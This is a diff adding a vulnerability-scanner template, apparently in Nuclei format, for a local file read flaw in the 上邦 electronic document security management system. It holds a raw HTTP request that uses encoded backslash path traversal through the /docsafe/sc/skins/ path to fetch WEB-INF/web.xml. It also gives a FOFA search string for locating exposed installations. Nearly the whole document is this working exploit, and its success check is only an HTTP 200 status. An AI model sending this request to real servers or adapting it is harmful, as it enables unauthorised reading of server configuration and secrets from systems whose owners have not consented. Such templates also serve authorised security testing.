@@ -1,0 +1,29 @@
+id: poc-gqkcmvce4yd2ac5z
+info:
+  name: 上邦-电子文档安全管理系统 skins 存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gqkcmvce4yd2ac5z'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gqkcmvce4yd2ac5z
+    fofa: app="上邦-电子文档安全管理系统"
+http:
+- raw:
+  - 'GET /docsafe/sc/skins/..%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
